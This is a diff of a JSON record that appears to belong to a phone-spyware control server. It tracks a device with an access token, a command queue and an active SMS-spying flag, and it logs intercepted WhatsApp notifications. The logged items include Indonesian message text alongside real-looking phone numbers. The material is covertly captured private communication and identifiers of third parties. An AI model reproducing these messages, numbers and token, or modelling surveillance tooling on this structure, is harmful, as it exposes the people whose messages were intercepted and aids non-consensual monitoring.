@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776891146867,
+    "lastSeen": 1776891153254,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎59 pesan dari 37 chat",
+        "time": "23/04 04:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776891155840
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "23/04 04:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776891155804
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎60 pesan dari 38 chat",
+        "time": "23/04 04:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776891155580
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "22/04 16:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1776845783448
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎54 pesan dari 34 chat",
-        "time": "22/04 16:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776845759751
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 838-5012-2452",
-        "content": "modal berapaa emangnya kak?",
-        "time": "22/04 16:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776845759721
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎53 pesan dari 33 chat",
-        "time": "22/04 16:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776845667324
       }
     ],
     "galleryPhotos": [],
